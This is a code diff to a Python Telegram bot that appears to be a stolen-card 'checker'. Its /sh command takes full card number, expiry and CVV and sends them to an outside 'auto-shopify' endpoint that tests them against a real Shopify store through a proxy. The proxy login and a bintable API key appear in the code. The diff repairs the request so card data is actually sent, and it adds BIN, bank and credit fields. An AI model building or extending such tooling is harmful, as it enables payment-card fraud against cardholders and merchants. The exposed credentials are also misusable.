@@ -2506,67 +2506,20 @@ async def consume_credit(user_id: int) -> bool:
     return False
 
 # --- BIN Lookup ---
-# --- BIN lookup helper ---
-import aiohttp
+# --- Background /sh processing ---
 import json
-import asyncio
 import logging
+from html import escape
+import aiohttp
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
-from html import escape
+
+from bin import get_bin_info  # <-- your custom BIN module
 
 logger = logging.getLogger(__name__)
 
 
-async def get_bin_details(bin_number: str) -> dict:
-    """
-    Fetch BIN details from bintable API.
-    """
-    bin_data = {
-        "scheme": "N/A",
-        "type": "N/A",
-        "level": "N/A",
-        "bank": "N/A",
-        "country_name": "N/A",
-        "country_emoji": "",
-        "vbv_status": None,
-        "card_type": "N/A"
-    }
-
-    url = f"https://api.bintable.com/v1/{bin_number}?api_key=a48d5b84128681e7b724ed6cb4b6420582847c69"
-    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
-
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, headers=headers, timeout=7) as response:
-                if response.status == 200:
-                    try:
-                        data = await response.json(content_type=None)
-                        if data.get("result") == 200 and "data" in data:
-                            card = data["data"].get("card", {})
-                            country = data["data"].get("country", {})
-                            bank = data["data"].get("bank", {})
-
-                            bin_data["scheme"] = str(card.get("scheme", "N/A")).title()
-                            bin_data["type"] = str(card.get("type", "N/A")).title()
-                            bin_data["card_type"] = str(card.get("type", "N/A")).title()
-                            bin_data["level"] = str(card.get("category", "N/A")).title()
-                            bin_data["bank"] = str(bank.get("name", "N/A")).title()
-                            bin_data["country_name"] = str(country.get("name", "N/A")).title()
-                            bin_data["country_emoji"] = country.get("flag", "")
-                            return bin_data
-                    except Exception as e:
-                        logger.warning(f"JSON parse error for BIN {bin_number}: {e}")
-                else:
-                    logger.warning(f"BIN API returned {response.status} for BIN {bin_number}")
-    except Exception as e:
-        logger.warning(f"BIN API call failed for {bin_number}: {e}")
-
-    return bin_data
-
-
-# --- Background /sh processing ---
 async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     try:
         user = update.effective_user
@@ -2588,49 +2541,61 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         cc, mm, yy, cvv = [p.strip() for p in parts]
         full_card = f"{cc}|{mm}|{yy}|{cvv}"
 
-        # --- API URL ---
+        # --- API URL (fixed f-string) ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://tackletech3d.com"
-            "&cc={cc}|{mm}|{yy}|{cvv}"
-            "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            f"&cc={cc}|{mm}|{yy}|{cvv}"
+            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
 
-        processing_msg = await update.message.reply_text(
-            "⏳ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩…"
-        )
+        processing_msg = await update.message.reply_text("⏳ Processing your request…")
 
         # --- Make API request ---
         async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=50) as resp:
+            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                 api_response = await resp.text()
 
-        # --- Parse API response ---
+        # --- Parse API response safely ---
         try:
             data = json.loads(api_response)
         except json.JSONDecodeError:
+            logger.error(f"API returned invalid JSON: {api_response[:300]}")
             await processing_msg.edit_text(
-                f"❌ Invalid response from API:\n<code>{escape(api_response)}</code>",
+                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                 parse_mode=ParseMode.HTML
             )
             return
 
-        # --- Fetch updated user credits ---
-        updated_user = await get_user(user.id)
-        credits_left = updated_user.get("credits", 0)
-
-        # --- Extract API fields ---
+        # --- Extract fields ---
         response = data.get("Response", "Unknown")
+        status = data.get("Status", "Unknown")
+        price = data.get("Price", "N/A")
         gateway = data.get("Gateway", "Shopify")
 
         # --- BIN lookup ---
-        bin_number = parts[0][:6]
-        bin_details = await get_bin_details(bin_number)
+        try:
+            bin_number = cc[:6]
+            bin_details = await get_bin_info(bin_number)
 
-        brand = (bin_details.get("scheme") or "N/A").title()
-        issuer = (bin_details.get("bank") or "N/A").title()
-        country_name = (bin_details.get("country_name") or "N/A").title()
-        country_flag = bin_details.get("country_emoji", "")
+            brand = (bin_details.get("scheme") or "N/A").title()
+            issuer = bin_details.get("bank") or "N/A"
+            country_name = bin_details.get("country") or "N/A"
+            country_flag = bin_details.get("country_emoji", "")
+            card_type = bin_details.get("type", "N/A")
+            card_level = bin_details.get("level", "N/A")
+            card_length = bin_details.get("length") or (15 if "amex" in brand.lower() else 16)
+            luhn_check = "✅" if bin_details.get("luhn", True) else "❌"
+            bank_phone = bin_details.get("bank_phone", "N/A")
+            bank_url = bin_details.get("bank_url", "N/A")
+        except Exception:
+            brand = issuer = country_name = country_flag = card_type = card_level = bank_phone = bank_url = "N/A"
+            card_length = 16
+            luhn_check = "N/A"
+
+        # --- Fetch updated user credits ---
+        updated_user = await get_user(user.id)
+        credits_left = updated_user.get("credits", 0)
 
         # --- User info ---
         requester = f"@{user.username}" if user.username else str(user.id)
@@ -2646,17 +2611,20 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- Final formatted message ---
         formatted_msg = (
-            f"═══[ <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬</b> ]═══\n"
-            f"{bullet_link} <b>𝐂𝐚𝐫𝐝</b> ➜ <code>{escape(full_card)}</code>\n"
-            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ {escape(gateway)} 6$💸\n"
-            f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{escape(response)}</i>\n"
+            f"═══[ <b>SHOPIFY</b> ]═══\n"
+            f"{bullet_link} <b>Card</b> ➜ <code>{escape(full_card)}</code>\n"
+            f"{bullet_link} <b>Gateway</b> ➜ {escape(gateway)}\n"
+            f"{bullet_link} <b>Response</b> ➜ <i>{escape(response)}</i>\n"
+            f"{bullet_link} <b>Status</b> ➜ {escape(status)}\n"
+            f"{bullet_link} <b>Price</b> ➜ {escape(price)} 💵\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} <b>𝐁𝐫𝐚𝐧𝐝</b> ➜ <code>{escape(brand)}</code>\n"
-            f"{bullet_link} <b>𝐁𝐚𝐧𝐤</b> ➜ <code>{escape(issuer)}</code>\n"
-            f"{bullet_link} <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b> ➜ <code>{escape(country_name)} {country_flag}</code>\n"
+            f"{bullet_link} <b>Brand</b> ➜ <code>{escape(brand)}</code>\n"
+            f"{bullet_link} <b>Bank</b> ➜ <code>{escape(issuer)}</code>\n"
+            f"{bullet_link} <b>Country</b> ➜ <code>{escape(country_name)} {country_flag}</code>\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</b> ➜ {requester}\n"
-            f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➜ {developer_clickable}\n"
+            f"{bullet_link} <b>Request By</b> ➜ {requester}\n"
+            f"{bullet_link} <b>Credits Left</b> ➜ {credits_left}\n"
+            f"{bullet_link} <b>Developer</b> ➜ {developer_clickable}\n"
             f"――――――――――――――――"
         )
 
@@ -2675,6 +2643,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             )
         except Exception:
             pass
+
 
 
 # --- Main /sh command ---
